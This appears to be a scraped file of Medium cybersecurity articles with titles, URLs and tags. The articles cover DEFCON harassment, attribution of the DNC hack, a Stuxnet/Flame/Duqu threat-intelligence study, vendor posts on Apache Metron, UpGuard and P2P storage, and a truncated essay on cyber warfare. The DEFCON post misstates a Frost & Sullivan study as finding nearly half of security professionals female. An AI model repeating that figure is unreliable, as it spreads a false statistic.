Finally, whatever the applications are, for any operating system, it’s prudent to do your research before you consider installing them. The web is your friend! Do a web search for the application’s name. Ignore whatever advertising or PR that you find. Read what other “computer geeks” have been writing about them in various forums. It’s also good to read third-party reviews for utilities and games in respected online and print magazines.
The realm of Linux rootkits is constantly evolving, so it’s best to keep up with the news and be aware. It’s a risk that affects all of us.
Did you enjoy this article?
Want more?
Help support my Patreon.
Thank you, thank you, thank you!
My name is Kim Crawley, and I’m an information security geek who also develops games on the side. Please support the Kickstarter for my new game Hackers Versus Banksters, a visual novel about revenge! You can also check out the free demo for Windows, Mac OS X, and Linux.
Hackers Versus Banksters Kickstarter
Hackers Versus Banksters demo via Itch.io
Written by
","['Malware', 'Security', 'Cybersecurity']"
When Will DEFCON Stop Being A Massive Sexist Cringe-Fest?,https://medium.com/@emilymaxima/when-will-defcon-stop-being-a-massive-sexist-cringe-fest-cd9d58ccb549?source=tag_archive---------7-----------------------,"It was late on the second night of the infamous DEFCON tech-security conference in 2011. I had been able to score a second badge to get in that year, and had invited my wife (who isn’t in infosec) to come to one of the events that happens once the lights of the main rooms at DEFCON go dark.
A friend of ours was DJing that night getting ready for his set inside the room we were waiting in line to get into when two of the physical security personnel (people the DEFCON organizers call “goons”) approached us.
“Hey guys,” he said to us. “Are you having a good time?”
“Sure!” I said. “It’s been fun so far.” I replied.
“How are you doing on your bribe card?” He asked.
“Oh, not great so far…” I replied.
DEFCON is known for the games available for the attendees to play. Games like “spot the fed” where the goal is to call out government employees who are attending the conference are enjoyed by participants who usually win a shirt, or some other form of swag in reward of their effort.
Another is a game called the “DEFCON goon bribe card” that involves doing favors for the goons. It’s a little like a scavenger hunt where attendees are encouraged (although not required) to do little favors for the goons, and in turn will be given favor by the goons at some point during the event.
The “Bribe Card” is a punch card of sorts. I only had one hole punched in mine; the “cold drink” space on the card(I had given a bottle of water from my hotel fridge to a goon). One of the goons now standing in front of us turned to my wife and said to her, “Well, if you want to help him out, we could punch ‘boobs’ for you.”
One of these volunteer security guards had literally just solicited to see my wife’s breasts right in front of me in exchange for a hole in my bribe card.
Unfortunately, this wasn’t an isolated event. As it turns out, DEFCON has been a notorious and aggressive ‘boys club’ for a long time. Not long ago, I had voiced these concerns publicly, when a fellow-infosec-er brought one of the female organizers of the convention in to make a comment on the incident I described with my wife:
Of course it isn’t Nikita’s fault that the convention has such a male-centric bent to it and that this type of behavior on the part of the attendees and staff is tolerated by others. Obviously it makes her and the other organizers uncomfortable enough to stop it when they see it, but at what point exactly will the annual gathering of the cringe-producers stop?
A year after my experience, Valerie Aurora (@vaurorapub) published a blogpost chronicling sexual harassment at DEFCON 20 in 2012. As her post points out, the harassment was so bad at DEFCON 19 that a “Red/Yellow card project” was created as a modest way to temper the rampant harassment problem. To their credit, DEFCON organizers offered to fund the printing of the cards, but the use of the cards had stopped by 2013 with apparently little impact on the culture of the convention at all.
Being in the midst of the 2016 DEFCON season, the problem doesn’t appear to have abetted much, if at all.
Not only are stories like this a grotesque mix of weird, desperate and creepy, this unholy mixture of pubescent horniness is eventually going to start driving women away, if it hasn’t already taken a toll as it is.
According to a 2015 study regarding women in the information security field done by Frost And Sullivan, nearly half of the security professionals in the field are female.
With tons of tech companies pushing to bring women into the fold, it’s time for the attendees and organizers of DEFCON to similarly start to take this problem a little more seriously.
This year, DEFCON is running a special event alongside the main show geared toward women dubbed “Tiarac0n”. The stated mission of Tiarac0n is to advance the careers of women in infosec and while it’s another solid effort to help support the ladies, the issue of sex harassment at main DEFCON is going to have to be a specific focus eventually.
I know that the people who bear the responsibility for this gross behavior are in the minority at the con, but even though their numbers are small, their impact on the enjoyment of the event is huge. By and large, DEFCON is a place for a lot of people from many different backgrounds joined together by a common interest and curiosity for technology to let loose and have a good time. This includes women!
As a matter of fact, there are a number of badass girls out there going to the cons and adding value to the overall community. These are women who put up with a lot of nonsense they shouldn’t have to still show up anyway. Women who would be sorely missed if they decided eventually to opt-out of attending exciting conventions like DEFCON, especially if it was over something dumb like sexual harassment.
I remember DEFCON as being a con built with fun in mind, and every year DEFCON brings something new and creative to the table to achieve that end. The girls want to be there and of course, we will continue to go to the conference in droves. Many of us will do so without raising a huge fuss over some of the questionable shit we see. But we also shouldn’t have to spend the whole time worrying that we’re going to be involved in an awkward situation for us because frankly, having a room full of dudes talking about the exact dick sizes of different porn stars has a way of fucking up that fun and relaxation the organizers are trying to create.
At the end of the day, it’s up to the organizers to make sure that the conference maintains that level of fun for as many of their participants as possible. It falls to their feet to iron out these wrinkles so that they don’t get a bad reputation, but for some people it may already be too late.
Written by
","['Sexism', 'Feminism', 'Tech', 'Information Security', 'Cybersecurity']"
Who hacked the Democratic National Committee? - Mark Arena - Medium,https://medium.com/@markarenaau/who-hacked-the-democratic-national-committee-c7e2f5531d3e?source=tag_archive---------7-----------------------,"Who hacked the Democratic National Committee?
I’ll preface this post by saying that I possess no information on this incident beyond what has been mentioned in open sources. This post is my personal opinion and is based on my experience researching and tracking both state and non-state cyber threat actors. I’ll also add that Intel 471 does not actively research and track threat actors that are involved with espionage and is focused on financially motivated cyber criminals and hacktivists/politically motivated threat actors.
On June 14, the Washington Post published a story that indicated Russian government hackers had hacked into the Democratic National Committee (DNC). The specific information linking the hack to the Russian government came from the cyber security company CrowdStrike:
One group, which CrowdStrike had dubbed Cozy Bear, had gained access last summer and was monitoring the DNC’s email and chat communications, Alperovitch said.
The other, which the firm had named Fancy Bear, broke into the network in late April and targeted the opposition research files.
I personally know a number of smart people who work at CrowdStrike and I trust them when they say that a specific intrusion or incident is linked to a specific hacking group. With regards to linking intrusion sets to groups, CrowdStrike uses an animal naming scheme to tie intrusion activity and intrusion sets to groups and countries. In this case CrowdStrike said that they observed intrusions in the DNC tied to the groups they call Cozy Bear and Fancy Bear where Bear signifies Russia. I have no doubts at all that CrowdStrike indeed observed intrusion set activity within the DNC’s environment that linked to these groups they had identified and were almost certainly actively tracking.
Guccifer 2.0: A spanner in the works
On June 15, an actor who calls himself Guccifer 2.0 created a Wordpress blog where he posted a number of claimed confidential reports from the DNC including one on Donald Trump. In the blog post, an effort appears to be made to say how easy it was to hack the DNC and called into question CrowdStrike who linked two intrusions of the DNC to the Russian government.
For those that aren’t aware, the handle Guccifer was used by a Romanian hacker who was recently extradited to the United States. This actor was involved with hacking high profile people such as politicians and celebrities and publicly releasing their emails. Guccifer currently sits in a jail in Virginia awaiting sentencing.
Russia? Attribution is hard right?
When it comes to attribution of intrusions to groups or specific people, we are really talking about two things:
On the first point, I have complete confidence that CrowdStrike is able to track and link specific intrusions tools to known groups which they actively track.
On the second point, it is a little more unclear whether this activity is tied to the Russian government and I can’t really comment on that as I don’t have information that supports this or not. This type of attribution is done in a number of ways but is not limited to:
Guccifer 2.0 did it!
One thing for sure with Guccifer 2.0 is that he clearly has demonstrated access to internal documents of the DNC. Given that, I believe there’s two possibilities:
On Guccifer 2.0 being a possible disinformation operation, I recommend closely looking at Guccifer 2.0’s writing. Based on the style and how it has been done, it looks like it was written by someone who doesn’t speak English as a first language and uses mannerisms used by people based in Eastern Europe or was purposely written like this. I also recommend reading the Twitter timeline for pwnallthethings which talks about claimed operational security (OPSEC) failures on behalf of Guccifer 2.0 and various files that were uploaded online. I’ll add that initially I was surprised by how quickly a disinformation operation could possibly have been executed after the Washington Post article.
Final Remarks
I’ll finish things off by repeating that in my opinion the emergence of Guccifer 2.0 does not at all conflict with CrowdStrike’s findings. Guccifer 2.0 may be a separate actor or may be tied to one or both of the intrusion groups CrowdStrike claims were active inside the DNC.
Written by
","['iSIGHT Partners', 'tie', 'Cybersecurity', 'Threat Intelligence', 'Cyber Threat']"
Who is GOSSIPGIRL? - Chronicle Blog - Medium,https://medium.com/chronicle-blog/who-is-gossipgirl-3b4170f846c0?source=tag_archive---------5-----------------------,"Revisiting the O.G. Threat Actor Supergroup
Threat intelligence as a discipline is the continuous pursuit of cyber situational awareness. The idea that there are threat actors out there, unbeknownst to us, operating in the shadows, with impunity is something that drives researchers to hunt further and further. The more unsettling experience is having a small piece of information on a threat without context: a single indicator, a rumor, …a name. That maddening uncertainty drove us from a vague name on a creative revisiting of a cluster of the most prolific and daunting threat actors ever discovered. And along the way, we were given the opportunity to fill in important gaps in the history of humankind’s incursion into the fifth domain.
Of the multitude of documents leaked from sensitive operations over the past six years, few are as rich and interesting as a CSEC presentation titled “Pay attention to that man behind the curtain: Discovering aliens on CNE infrastructure”. Bullet listings meant to serve as a presenter backdrop are often too anemic to provide meaningful food for thought in the absence of the speaker, but that’s not the case here. The CSEC slidedeck discusses different methods for conducting Counter-CNE (i.e.: threat intelligence). Among the fascinating insights is a list of threat actor cryptonyms including names like SEEDSPHERE, ALOOFNESS, and VOYEUR.
Slide highlighting some of the threat actors tracked in REPLICANTFARM by their cryptonyms
Some of these actor names, like MAKERSMARK and SNOWGLOBE are now familiar to us. The former now a common name related to Moonlight Maze, Agent.BTZ, and Turla. The latter (as the presentation goes on to detail) is another name for Animal Farm and includes its well-known Babar malware family. But who are these other actors worthy of rising to the scrutiny of our northern siblings?
We combed through the presentation inch by inch, hoping some small fragment would slip out that we’d be able to associate to the unidentified actors. A small sliver of hope presented itself in Slide 23. A pixelated screenshot of an alerts window shows barely legible signature names like mod_101_MM_CARBON — a likely reference to MAKERSMARK’s (i.e.Turla’s) Carbon system. That would mean the format of these signatures is:
Combing through the other legible names, we were largely stumped. The actor acronyms were either unrecognizable or the malware family names were unfamiliar or of little hunting value. However, one signature stood out, ‘mod_501_GR_FLAME.pl’. Was this a connection between GOSSIPGIRL and Flame? The thread was thin but it was all we needed to set us off on our parallel investigation.
Flame (a.k.a Flamer or sKyWIper) was the object of extensive research and fascination by the security community circa 2011. Crysys Lab, Kaspersky Lab, and Symantec researchers contributed extensive analyses on this modular cyberespionage platform. While some in the security community were skeptical of the hype generated by claims of yet another modular platform discovered soon after Stuxnet and Duqu, Flame impressed all with the discovery that it employed a novel cryptographic attack to impersonate a Windows Update server within an enterprise and spread onto other computers as if legitimately signed by Microsoft itself. Ultimately, it turned out that the fortuitous discoveries of Stuxnet, Duqu, and Flame were in fact related beyond superficial succession.
So how best to start an investigation into what CSEC might’ve been looking at with Flame? Well, we could turn to a different leak. As part of the Shadow Brokers leaks, the security community got access to a series of malware signatures for a program identified as Territorial Dispute (‘TeDi’). The TeDi signatures are an interesting (if likely outdated) snapshot of Five Eyes Counter-CNE efforts and, as such, a great starting point for rebuilding what might be categorized under the GOSSIPGIRL moniker. Dr. Boldizsár Bencsáth published excellent work identifying a portion of the TeDi signatures. Among them, two signatures for Flame (SIG9 and SIG16) as well as a signature for its likely predecessor, Miniflame (SIG10).
It’s important to remember just how nascent threat intelligence really is as a field. Pre-2010, the anti-malware industry considered cyberespionage a possibility, or perhaps an eventuality, but not an ongoing phenomenon. What followed was a dizzying period of discovery that made the industry realize that malware-based digital espionage was not only going on, but had been going strong, unnoticed for years. The tranquil days of reverse engineering banking trojans were pierced by Stuxnet, Duqu, Flame, Gauss, and MiniFlame. Each a complex modular malware family worthy of its own pedigree, most abusing zero-day exploits, and used to carry out operations imbued with geopolitical gravitas.
However, the rapid rate of discovery often leads modern practitioners to mistakenly assume that the tooling available to the researchers involved in these discoveries is any way comparable to our own. Remember that at the time YARA rules were not widely used for malware research. Nor did researchers have access to VirusTotal retrohunts, code similarity searching at scale, ngram or byte-string searches, etc. Most of the modern tooling that makes hunting for malware scalable was not available. Instead, these researchers were relying on tooling proprietary to each AV company and stitching their visibility together as best they could to form a picture. The limitation only makes their discovery more admirable but it also made us wonder ‘what did they miss?’
Ultimately, we decided to take creative license with the GOSSIPGIRL term and use it for two purposes: to compensate for an ontological deficiency in threat intel terminology, and, to investigate a collaborative umbrella of threat actors.
Private sector Threat intelligence has largely shied away from abstract methodological discussions. Our concepts have largely served us well, except when it comes to outliers like mercenary APTs or fourth-party collection practices. However, ignoring methodological deficiencies leads to problematic blind spots. In particular, the one-to-one equivalence of a ‘threat actor’ to an institution or organization has left us incapable of accurately representing multi-institution, multi-country, or multi-group orchestration in collaborative operational deployment, platform development, or generally complex deconfliction practices.
The resulting limitations are best exemplified by Regin as a likely multi-country platform, Equation as a likely multi-institution umbrella, and Red October as a possible dual-country collaboration. While each of these ‘threat actors’ was researched extensively and competently, the industry was ill-equipped to describe the perpetrator arrangement faithfully. For that, we want to introduce the concept of a Supra Threat Actor or STA.
The introduction of a supra category of activity clustering isn’t meant to add complexity to an already jargon-filled space but rather to allow us to faithfully describe the interesting phenomenon of multi-threat actor or multi-platform operations. The staple of these (as opposed to a threat actor that uses two or more closed-source malware families) is a formalization of cross-platform compatibility that allows droppers, payloads, and configuration files be co-opted and instrumented by the closed-source tooling of other threat actors. We have seen multiple examples of this next-level development practice amongst the true apex threat actors.
A notable example is appears to be the case of the Wzowski API that allows the CSEC and DSD’s WARRIORPRIDE, GCHQ’s DAREDEVIL, and NSA’s STRAITBIZZARRE and UNITEDRAKE tooling to work together despite independent development practices.
With GOSSIPGIRL we’ll be discussing another example of a collaborative threat actor umbrella.
As we conducted our parallel investigation into Flame we found ourselves retracing steps from one malware platform to another, much like the researchers that originally discovered them. First from Flame to Mini-Flame, it’s likely predecessor, and then to Gauss, considered a more widespread successor or perhaps a side operation. However, despite the lore of Gauss (due to its never-cracked encrypted payload), we didn’t find a live lead there. We were impressed by the relative simplicity of Mini-Flame and the completely restructured modular architecture of Gauss, but ultimately it seemed that Flame had died with the deployment of the SUICIDE module in May 2012.
Instead, we shifted our focus onto Stuxnet. In June 2012, Kaspersky researchers discovered that the older version of Stuxnet included a Flame plugin, Resource 207. This connected Flame as one of the threat actors involved in the development of Stuxnet. And it ultimately placed Stuxnet in a central role for our research into the GOSSIPGIRL STA. If we are going to treat GOSSIPGIRL as a collaborate supergroup of threat actors, then Stuxnet represents the fruit of their collaboration. As such, Stuxnet placed at least two other threat actors within the scope of our research: Duqu and Equation.
Researchers connected Duqu to the development of Stuxnet early on. Main Stuxnet kernel drivers (like ‘mrxcls.sys’) shared developmental links with Duqu’s ‘Tilde-D platform’, involving the threat actor in some of the central development of Stuxnet. Equation, on the other hand, would eventually be connected by the use of exploits shared by both Stuxnet and an earlier Equation Group worm named Fanny. Fanny utilized two Stuxnet zero-days 1–2 years before Stuxnet entered the scene: the infamous LNK exploit (CVE-2010–2568) and a privilege escalation embedded in the aforementioned Resource 207. Furthermore, Kaspersky researchers would note shared coding practices between the Stuxnet and Equation developers.
Choosing to stand on the shoulders of the research giants that discovered these operations, we decided to dive once again into the malware. We hoped that leveraging technology and insights unavailable to our predecessors would yield a greater understanding of the GOSSIPGIRL STA. The resulting discoveries were beyond our wildest expectations.
GOSSIPGIRL Supra Threat Actor cluster of interrelated actors and malware platforms including new discoveries.
After casting such a wide net for insights on what was supposed to be old news, we actually fished out more discoveries than we could handle. Each of these merits a technical deepdive in its own right and links are provided for a technical writeup detailing each. We hope other researchers, malware analysts, and defenders will benefit from the breakdowns and technical indicators. In brief:
Stuxshop is ancient component folded into Stuxnet to manage it’s early command-and-control capabilities. The discovery of Stuxshop is significant precisely because it unveils the presence of a fourth team involved in the early development of Stuxnet. Stuxshop shares unique code overlaps with Flowershop (a.k.a. TeDi: SIG17/SIG18, Cheshire Cat), a malware platform active from 2002–2013 with targets across the Middle East.
Stuxshop function call graph highlighting identical embedded Flowershop functionality
Key takeaways:
Read Stuxshop technical analysis (pdf)
An investigation into a ‘Ghost in the Wires’ infection at a venue for diplomatic talks revealed a missing link in the development from the Duqu 1.0 threat actor involved in Stuxnet to the formidable Duqu 2.0 in-memory modular platform discovered in the Kaspersky offices and P5+1 talk venues in Switzerland. This story highlights what can be accomplished when an excellent in-house incident response team collaborates with threat researchers to hunt down an elusive threat.
Duqu 1.5’s experimental modular design
Key takeaways:
Read Duqu technical analysis (pdf)
Finally, the third and perhaps most momentous finding was our discovery that Flame merely faked its own death. In May 2012, the Flame operators issued a SUICIDE module to clean up active infections and burned down their remaining command-and-control infrastructure. While this move successfully drove researchers away from tracking Flame, in reality they were simply retooling. At this time, we are releasing technical indicators and initial findings of a new iteration, Flame 2.0, and inviting the research community to collaborate with us in investigating its resurgence.
Mapping leaked build times show’s a development beyond deployment of Flame 1.0’s SUICIDE module
Key takeaways:
Read Flame 2.0 technical analysis (pdf)
We are often asked why we bother investigating older threat actors. Why bother with ‘cyber-paleontology’? The reasons are manifold:
Firstly, research into past incidents allows us to leverage new tools and insights that weren’t available at the time of initial discovery. At the time Stuxnet, Flame 1.0, and Duqu 1.0 were discovered, YARA rules weren’t widely used, VirusTotal’s retrohunt capability weren’t available, nor did we have access to scalable code similarity engines.
Secondly, retrospective research allow us to unearth connections between diverse threat actors and malware platforms that expand our understanding of the notable adversaries in cyberspace and their respective institutional configurations. These insights speak to humankind’s incursion into the fifth domain. If we fail to study and document these incidents while the source data is still available, it may prove impossible in the future.
Finally, if it’s not evident by now, retrospective research yields unexpected surprises. While the research community assumed Flame had retired and ceased to track this ominous threat actor, Flame 2.0 samples appeared in VirusTotal as early as October 2016 and were likely available in private AV collections a year or two before that. Given that Flame proved to be one of the most daring threat actors ever discovered (going so far as to leverage an innovate MD5 hash collision attack to subvert the Windows Update mechanism to spread infections across an enterprise), this isn’t an adversary we should take lightly in our remit to defend the internet ecosystem.
From a methodological standpoint, we hope that the research community will take cautious advantage of a higher ontological category to describe collaborative frameworks for multiple threat actors. GOSSIPGIRL isn’t the first supra threat actor (STAs) unearthed by the research community, it’s only the first to be described in comprehensive terms. A focus on this ‘multi-tenant’ model of modular malware development and deployment should allow for a higher-fidelity understanding of: the trends followed by seemingly diverse threat actors, the closed-door sharing of techniques and tools, and the organizational complexities behind clusters of malicious activity that defy simplistic attribution claims.
Discovering, understanding, and continuously monitoring complex attacks is difficult and requires a mixture of specialized talent, tooling, and visibility that most enterprises and institutions don’t have access to. It’s unrealistic to expect every company to develop these capabilities in-house. However, as the Duqu 1.5 example shows, the collaboration between driven incident responders and threat researchers yields insights that benefit our shared defense mission in a way neither could accomplish on their own.
A better understanding of the institutions and incentives involved in cyberespionage further supports the view that threat actors don’t go away after exposure; our aggressors never truly vanish. They have an intelligence remit to fulfill and will go to great lengths in doing so. The defender community must be willing to match these efforts in order to insure the collective safety of users and organizations that lack the resources to defend themselves against the most formidable threat actors.
Written by
","['Cybersecurity', 'Stuxnet', 'Duqu']"
Why Apache Metron and Cyber Analytics Matters in 2016,https://medium.com/@b23llc/why-apache-metron-and-cyber-analytics-matters-in-2016-15fed4169f9f?source=tag_archive---------2-----------------------,"Since our last series of blog posts making the case for the Next Generation of Cisco’s OpenSOC solution, we are pleased to announce that the project has been accepted into the Apache Software Foundation as an incubating project to satisfy the vision we set forth (http://bit.ly/1ZO8RD0). This occurred in December 2015 under the stewardship Hortonworks (NASDAQ:HDP).
B23 is now in our second year supporting the open source OpenSOC codebase, and we are proud to represent a significant part of the Project Management Committee (“PMC”) and Committer members within the Apache Metron incubation project.
Over the past two years, we have deployed Metron in a variety of customers and environments each with unique use cases and objectives. As a result of this experience, we have started to develop our own set of best-practices relative to deployment, configuration, and development focus.
B23 is now the longest, continuously operating organization to support this code base. We are flattered that one of our B23 Committers won the vote for the proposed name ‘Metron.’ We will continue to increase our involvement within Apache Metron in the future.
In 2016, we have four (4) focus areas for Apache Metron which are based on our unique set of experiences and capabilities.
From a data acquisition perspective, we believe raw packet capture (“PCAP”) is important for understanding the true fidelity of network behavior. Commodity, low-cost storage, and the Hadoop Distributed Filesystem (“HDFS”) make it technically and economically feasible to store, organize, and query enterprise-scale packet metadata and content. While the original OpenSOC project supported PCAP in certain use cases, we have continued to develop features and capabilities to make PCAP collection more central to our Metron deployments. This includes additional temporal and geospatial trending of PCAP information in the Metron operational dashboard in real-time.
Metron has proven its effectiveness and scalability as an aggregator for disparate security information from a multitude of sources. Often its initial value to most of our customers is viewing that security information as events and alerts within a single pane-of-glass. This common operational picture (“COP”) of security information is a great use case in its own right for Metron. Fortunately, we believe there is a lot more potential for Metron.
B23 has now incorporated Apache Spark and Apache Zeppelin into our Metron deployments to add a data science and analytical component to cybersecurity. Using network packet data, we are able to ask more complex questions of our data using Apache Spark, and visualizing those results in Apache Zeppelin. OpenSOC had no analytical capability previously, and now with our inclusion of Spark and Zeppelin, it does. Our mission in 2016 is to bring data science to the SOC.
Embedded devices and the Internet-of-Things (“IoT”) will require a new paradigm for efficiently securing a new generation of distributed and diverse data telemetry sources. Retail, Healthcare, Automotive, and Financial Services will all be impacted by the proliferation of embedded devices.
Metron ships with some basic Python utilities to instrument data from generic devices. These are good for getting started and prototyping. In 2015, we developed several Python probes using advanced multi-threading techniques that could scale up to a certain point based on the underlying hardware. In one case, we “broke” Python after experiencing global interpreter lock when trying to add a network packet to Kafka faster than every 0.0000001 seconds. We realized quickly we needed to adapt. As a result, we started building endpoint collection capabilities using C. The benefits to using C as a low-level programming language are well known. Using C allowed us more granular control and flexibility at a hardware level to accommodate a wider variety of embedded devices, as well as enhancing the speed at which our collection probe could operate relative to Python.
One of our favorite quotes that we show customers about the legacy OpenSOC solution came right from an official product description stating “What OpenSOC is not…” in which one bullet point is “…easy to install and get working quickly.” At B23, Necessity is the Mother of Invention. We have developed a capability using well known “devops” automation tools to deploy Metron in minutes versus days and weeks. Our customers don’t want to spend money and time to deploy Metron and its components, but desire to get right to the collection and analysis of network security information. We adhere to this perspective as well, and we will continue to invest time and effort to enhance our automation capabilities to support a variety of different deployment scenarios and environments. Our core work at B23 automating the deployment of large distributed processing systems, as well as massive horizontal scale-out Cloud infrastructures have allowed us to iterate quickly in this focus area.
2016 has started off with an enormous amount of interest and opportunity for Apache Metron. We look forward to continuing this journey by hiring great data scientists and developers to support our focus areas. Most importantly, we will continue to enable more of our customers to operate their business enterprises more securely.
Written by
","['Big Data', 'Cybersecurity', 'Data Science']"
Why Companies Have Data Breaches And I Have To Get A New Debit Card And This Is Bullshit,https://medium.com/@fart/why-companies-have-data-breaches-and-i-have-to-get-a-new-debit-card-and-this-is-bullshit-9168eeaf2c0a?source=tag_archive---------2-----------------------,"In many situations, it’s because IT risk assessment — until recently — has been a joke. Sorry, I know this is boring, but you might be interested to learn exactly how much it sucked and why.
First, put yourself in the shoes of a Target CEO/CFO/CRO a few years ago, right before their big data breach. If someone were to ask, “How likely are we to have a huge data breach that screws us over for years to come?” how would you answer? Basically, you know your IT infrastructure is huge and sprawling and always changing. You’ve got an online store, thousands of brick-and-mortar stores with dozens of point-of-sale systems each, and an infrastructure linking the whole thing that’s extremely complex. That is pretty much all you know. That’s all you could know.
And the story was the same for every large company out there, not just Target. For as advanced as companies had gotten in the 21st century, there were still 3 primary ways an average executive could have their risk of data breaches measured back then — contextual data, external prodding, and — no kidding— employee surveys.
Seriously, surveys. Companies would actually ask employees, “How do you think we’re doing on IT security? Do you think our servers are secure?” and they’d all fill in bubbles indicating how they felt on a scale of 1 to 10. That was one of the primary risk measurement tools for enormous billion-dollar companies that use our personal data. Don’t know about you guys, but it makes me feel better to know my SSN and DOB were in the care of executives filling out all 10’s on their surveys to get back to reading Facebook as fast as possible.
External testing isn’t quite so bad, but it’s more or less comprised of common “script kiddie” attacks from the outside and running nmap to see if anyone left any doors wide open. That’s fine for getting some information about public-facing devices, but doesn’t say anything for internal machines, routers, firewalls, and whatever else is running behind the curtain. You’re only scraping the tip of the iceberg here, and even then, you’re only looking for the easy stuff. C’mon.
And using contextual information to predict the risk that a company will be breached is a lot like using the Farmer’s Almanac to predict next year’s weather. This methodology uses things like your industry, company size, and so on to suggest — “Well, this company similar to yours got breached 3 years ago. That means you might be breached soon. Or not. Maybe. Possibly not. Or, wait, maybe?”
This was how it was done everywhere. Every site you’ve ever put your information into, everywhere you’ve ever swiped your credit card, every airline you’ve flown on and every job you’ve ever had. They all used some combination of the above methods to determine whether or not our stored identities were reasonably safe. These were such poor and incomplete indicators that many insurers wouldn’t touch some of them with a 10-foot pole.
Having had my card information leaked from data breaches in the past myself, I’m very pleased to be part of the company changing things. At UpGuard we look at everything — from the inside. Our software looks at how every server, network device, and endpoint are configured to understand actual risk potential. We check for known software vulnerabilities, compliance, and system integrity and boil it all down into a single number — basically a credit score for IT risk. We do this so even the most tech-averse CEOs and executives can understand “Ah, we’re doing bad,” or, “Hey, we’re in a decent spot relative to others.”
As companies improve their IT state, their risk potential falls and their score rises. And as an added benefit, they can use that score to prove to insurers that they’re doing well, resulting in lower premiums and money saved all around. It’s pretty good.
Not every breach can be prevented, but we’re able to help make things a whole lot better. And maybe in the near future, I won’t have to get a damned new debit card number every year.
Written by
","['Cybersecurity', 'Security', 'Risk Management']"
"Why companies keep using the cloud, even while they know it’s unsafe",https://medium.com/storro-blog/why-companies-keep-using-the-cloud-even-while-they-know-its-unsafe-d3c200210d64?source=tag_archive---------5-----------------------,"In times like these, with news on high-profile hacks and industrial cyber-espionage hitting the headlines on a daily basis, one would expect that companies would like to keep their sensitive data under their own control as much as possible.
One would certainly not expect them to hand it over to some third party, ran by people they’ve sometimes even never seen. One would not expect them to take the other company’s word for it, to keep the data safe. A third party that puts the data of multiple clients on a single server, making this server attractive to hackers.
One would expect that companies would like to keep their sensitive data under their own control as much as possible
A party that usually controls the keys to the data it stores, meaning that a blackmailed or disgruntled employee has access to this data too. A party that fiercely opposes being held legally accountable for the safety of the data it keeps. That often will be obliged by law to hand over private information when its government requests it– and you’re not even informed about this, so you cannot even bring them to court. That probably is required to have some built-in back doors for ‘surveillance’ purposes.
And yet, in spite of all this, the cloud is booming.
Many companies are aware of these issues and feel really uncomfortable about this. But still, they adopt a cloud solution, simply because they think that they have no other choice. Here are some reasons why companies may feel compelled to use the cloud.
Quality cloud providers have a lot of security know-how. And despite all the issues listed above, they still deliver a pretty secure service. Many small and medium-sized businesses lack the technical knowledge to organize such a level of security themselves, so they see the cloud as the safest option they have.
There was a time when a stolen laptop or crashing hard disk could mean total panic. If people did not take the effort to make back-ups on a regular basis, they could lose months, or even years of work. With the cloud, that is no longer a problem. No worries about back-ups anymore. Even if your laptop gets stolen, you can still access your work.
Storing digital data entails way more than filing stuff away on a hard drive. Data servers need different software programs to keep them running. This software needs to be maintained and updated. Somebody has to make sure everything is compatible and runs in an efficient manner. Cloud services specialize in this kind of maintenance. So, for many companies it is an attractive option to let the cloud service take over the technical details of data storage.
Cloud services are popular for a reason. Companies who move to the cloud cut maintenance costs and get their hands free to focus on their core business. Their employees can work from anywhere and they get access to automatic version control. This means that the dozens of e-mails concerning ‘Mike’s comments on revision three of the second draft of project X’ are a thing of the past. For most companies, it is hard to ignore that ease of use and flexibility.
User-friendliness is one of the strong points of cloud services. In fact, they are so user-friendly that people use them without even realizing it. Next to the company’s officially approved cloud services, employees unintentionally rely on dozens of other cloud-based apps to get their work done. That handy online text editor you use to cut-and-paste chunks of text you may need later on? That’s a cloud service. That collaboration app your team uses to chat and comment on each other’s work? Ditto. That great note-taking app you are always using? Well, you get the idea by now..
When it comes to safe data storage, version control and the facility to work from anywhere, cloud services have become the industry standard. Many companies are simply unaware of the alternatives. They believe that the cloud’s drawbacks are something they have to accept if they want to make use of this functionality.
Many companies are simply unaware of the alternatives
But this is not the case. There are alternatives. A small, but growing number of companies offer services based on the peer-to-peer model (P2P). The peer-to-peer model can offer all the neat functionality of the cloud without the cloud’s security issues. While these alternatives may currently be largely unknown by the general public, all this is about to change. What peer-to-peer storage is and why it is likely to disrupt the way we store data will be the subject of our next post.
So stay tuned!
Written by
","['Cloud Computing', 'Technology', 'Cybersecurity', 'Privacy']"
Why cyber warfare isn’t - Mike’s blog,https://blog.plan99.net/why-cyber-warfare-isnt-9db27b4d50e0?source=tag_archive---------8-----------------------,"The BBC is reporting that there is a major outbreak of ransomware, causing — amongst other problems — hospital outages across the UK which might lead to people dying. The virus appears to be spreading by exploiting a bug codenamed ETERNALBLUE that was discovered by, hoarded by and eventually stolen from the NSA.
This event happened due to issues that developed over many years. One of the issues (though not at all the only one) is how governments understand the term “cyber warfare”. This term has spread rapidly throughout government in the past 20 years. Presidents, Prime Ministers, generals and journalists all believe they understand what “cyber warfare” is, but they don’t and this lack of understanding leads to events like today’s.
The big problem is that cyber warfare is totally different to normal warfare, in fact it’s so different that calling it warfare at all is meaningless. In regular warfare you can build up your own defences without improving your opponent’s defences, and you can develop new weapons that your opponents will not have. This basic asymmetry is key to the very concept of war: the side with the better weapons, defences and tactics should normally win.
But cyber warfare doesn’t work like that. Because everyone uses the same software infrastructure, and the “weapons” are nothing more than weaknesses in that global infrastructure, building up your own defences by fixing problems inherently builds up your opponents defences too. And developing new “weapons” is only possible if your opponents are able to develop the very same weapons for themselves, by exploiting the very same vulnerabilities in your country that you are exploiting in theirs.
Governments have huge problems understanding this fact because politicians tend to reflexively trust their own intelligence agencies, who deliberately obfuscate about it. Both the NSA and GCHQ like to pretend that they’re engaged in defence. The NSA has a thing called the Information Assurance Directorate (IAD) which is charged with defending America’s networks. And when the agencies engage in PR it’s only that work that’s mentioned. In what must be the worst timed tweet in history, GCHQ decided to engage in this kind of self-promotion during the same hours in which British hospitals were being shut down by hackers:
Yet in reality these organisations systematically keep their countries vulnerable to cyberattack because their organisational structures create powerful incentives to do so.
The problem is simple — western intelligence agencies generally answer directly to heads of state. They engage in spying and feed the tidbits and tipoffs upwards, giving leaders regular reports on what their counterparts in other countries are thinking and saying. This stream of intelligence is incredibly attractive to governments, who can’t help but believe it gives their country a valuable edge in a dangerous world.
What they can’t see is the fact that the counterparts are receiving very similar reports about their own thinking and saying, based on very similar hacks of their own infrastructure. Successful spying is invisible and undetected. The infiltration of critical national infrastructure by enemies of the state happens quietly and without anyone realising until it’s too late. A successful penetration of someone else’s infrastructure yields an unforgettable intelligence report that makes the government feel successful and in control. A successful penetration of your infrastructure yields nothing visible at all.
